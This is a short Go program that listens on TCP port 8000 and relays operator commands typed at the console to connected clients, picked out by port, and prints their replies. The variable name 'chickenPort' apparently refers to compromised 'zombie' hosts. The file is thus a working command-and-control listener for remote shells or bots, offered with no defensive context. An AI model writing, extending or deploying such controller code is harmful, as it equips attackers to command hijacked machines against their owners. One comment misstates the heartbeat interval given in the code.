package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"reflect"
	"strings"
	"time"
)

func echo(conn *net.TCPConn) {
	tick := time.Tick(2 * time.Second) // 五秒的心跳间隔
	for now := range tick {
		var rAddr = conn.RemoteAddr()
		fmt.Println(rAddr, " =======>\n")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.Replace(cmd, "\n", "", -1)
		fmt.Println(now, "cmd: ", cmd)
		var cmdArr = strings.Split(cmd, " ")
		var chickenPort string = cmdArr[0]
		fmt.Println(rAddr, chickenPort, reflect.TypeOf(chickenPort), reflect.TypeOf(rAddr.String()))
		if chickenPort == strings.Split(rAddr.String(), ":")[1] {
			var realCmd = strings.Join(cmdArr[1:], " ")
			fmt.Println("ready execution: ", realCmd)
			n, err := conn.Write([]byte(realCmd))
			if err != nil {
				log.Println(err)
				conn.Close()
				return
			}
			fmt.Printf("send %d bytes to %s\n", n, rAddr)
			fmt.Printf("send %s\n", string(realCmd))
		} else {
			fmt.Println("loss: ", rAddr)
			continue
		}

	}
}

func reply(conn *net.TCPConn) {
	for {
		tmp := make([]byte, 256)
		m, _ := conn.Read(tmp)
		if m > 0 {
			resp_str := string(tmp[:m])
			fmt.Println(resp_str)
			tmp = make([]byte, 256)
		}
	}
}

var reader = bufio.NewReader(os.Stdin)

var ip = "0.0.0.0"

func main() {
	address := net.TCPAddr{
		IP:   net.ParseIP(ip),
		Port: 8000,
	}
	listener, err := net.ListenTCP("tcp4", &address) // 创建TCP4服务器端监听器
	if err != nil {
		log.Fatal(err) // Println + os.Exit(1)
	}
	for {
		conn, err := listener.AcceptTCP()
		if err != nil {
			log.Fatal(err) // 错误直接退出
		}
		fmt.Println("remote address:", conn.RemoteAddr())
		go echo(conn)
		go reply(conn)
	}
}
